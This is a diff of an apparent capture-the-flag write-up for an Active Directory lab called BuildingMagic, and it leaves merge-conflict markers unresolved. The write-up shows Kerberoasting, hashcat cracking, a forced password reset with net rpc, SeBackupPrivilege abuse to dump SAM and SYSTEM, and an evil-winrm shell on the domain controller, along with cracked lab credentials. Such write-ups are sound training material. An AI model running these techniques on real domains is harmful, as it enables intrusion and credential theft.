@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 ---
 Description: >-
   Full Active Directory compromise via Kerberoasting, ForceChangePassword, LLMNR
@@ -5,6 +6,8 @@ Description: >-
 icon: building
 ---
 
+=======
+>>>>>>> b264669 (New Changes)
 # BuildingMagic
 
 | Field                 | Value                                               |
@@ -73,9 +76,7 @@ nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron' --shares
 | NETLOGON   | —           | Logon server share                           |
 | SYSVOL     | —           | Logon server share                           |
 
-{% hint style="warning" %}
-`r.widdleton` had no write access to `File-Share` at this stage. Further enumeration was needed.
-{% endhint %}
+> **Note:** `r.widdleton` had no write access to `File-Share` at this stage. Further enumeration was needed.
 
 ***
 
@@ -90,17 +91,20 @@ nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' \
 
 Collection methods resolved: `acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts`
 
-{% hint style="info" %}
-ADCS enumeration returned 0 certificate templates and 0 Enterprise CAs — no ESC attack paths were available.
-{% endhint %}
+> **Note:** ADCS enumeration returned 0 certificate templates and 0 Enterprise CAs — no ESC attack paths were available.
 
 ***
 
 ## 4. BloodHound Analysis
 
+<<<<<<< HEAD
 ![BloodHound node view for R.WIDDLETON](../.gitbook/assets/bloodhound-widdleton-node.png)
 
 > BloodHound node view for `R.WIDDLETON@BUILDINGMAGIC.LOCAL`
+=======
+![BloodHound node view for R.WIDDLETON](images/bloodhound-widdleton-node.png)
+*BloodHound node view for `R.WIDDLETON@BUILDINGMAGIC.LOCAL`*
+>>>>>>> b264669 (New Changes)
 
 Analysis of `r.widdleton` showed:
 
@@ -111,9 +115,14 @@ Analysis of `r.widdleton` showed:
 
 BloodHound's **Kerberoastable Users** query revealed a single target:
 
+<<<<<<< HEAD
 ![BloodHound Kerberoastable users query showing R.HAGGARD](../.gitbook/assets/bloodhound-haggard-kerberoastable.png)
 
 > BloodHound Pathfinding showing `R.HAGGARD@BUILDINGMAGIC.LOCAL` as the only Kerberoastable user
+=======
+![BloodHound Kerberoastable users query showing R.HAGGARD](images/bloodhound-haggard-kerberoastable.png)
+*BloodHound Pathfinding showing `R.HAGGARD@BUILDINGMAGIC.LOCAL` as the only Kerberoastable user*
+>>>>>>> b264669 (New Changes)
 
 **Attack path identified:**
 
@@ -150,9 +159,7 @@ $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$BUILDINGMAGIC.LOCAL\r.haggard*$9db208
 hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt
 ```
 
-{% hint style="success" %}
-**Cracked:** `r.haggard : rubeushagrid`
-{% endhint %}
+> **Cracked:** `r.haggard : rubeushagrid`
 
 SMB validation confirmed the credentials. `r.haggard` now has READ access to `NETLOGON` and `SYSVOL`.
 
@@ -162,9 +169,14 @@ SMB validation confirmed the credentials. `r.haggard` now has READ access to `NE
 
 BloodHound revealed that `r.haggard` holds the `ForceChangePassword` edge over `h.potch`, meaning the password can be reset without knowing the current one.
 
+<<<<<<< HEAD
 ![BloodHound ForceChangePassword abuse panel for H.POTCH](../.gitbook/assets/bloodhound-potch-forcechangepassword.png)
 
 > BloodHound abuse info panel for the ForceChangePassword edge on `H.POTCH@BUILDINGMAGIC.LOCAL`
+=======
+![BloodHound ForceChangePassword abuse panel for H.POTCH](images/bloodhound-potch-forcechangepassword.png)
+*BloodHound abuse info panel for the ForceChangePassword edge on `H.POTCH@BUILDINGMAGIC.LOCAL`*
+>>>>>>> b264669 (New Changes)
 
 Using Samba's `net rpc` tool:
 
@@ -174,9 +186,7 @@ net rpc password "h.potch" 'NewPass!@' \
   -S '10.0.17.7'
 ```
 
-{% hint style="success" %}
-Password changed successfully. `h.potch : NewPass!@`
-{% endhint %}
+> **Result:** Password changed successfully. `h.potch : NewPass!@`
 
 SMB validation confirmed the new credentials, and `h.potch` has **READ,WRITE** access to `File-Share`.
 
@@ -199,9 +209,7 @@ h.grangon::BUILDINGMAGIC:2e892b8635e20f7f:B74280E1743FF770...
 
 The hash was cracked offline:
 
-{% hint style="success" %}
-**Cracked:** `h.grangon : magic4ever`
-{% endhint %}
+> **Cracked:** `h.grangon : magic4ever`
 
 Validation confirmed `h.grangon` has **READ,WRITE** access to `File-Share`.
 
@@ -226,9 +234,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-{% hint style="danger" %}
-`SeBackupPrivilege` allows reading **any** file on the system regardless of ACLs — including the SAM and SYSTEM registry hives which store local password hashes.
-{% endhint %}
+> **Warning:** `SeBackupPrivilege` allows reading **any** file on the system regardless of ACLs — including the SAM and SYSTEM registry hives which store local password hashes.
 
 ### Dumping the SAM and SYSTEM Hives
 
@@ -272,9 +278,7 @@ evil-winrm -u 'a.flatch' \
   -i dc01.buildingmagic.local
 ```
 
-{% hint style="success" %}
-Shell obtained as `a.flatch` — local Administrator on the Domain Controller.
-{% endhint %}
+> **Result:** Shell obtained as `a.flatch` — local Administrator on the Domain Controller.
 
 ***
 
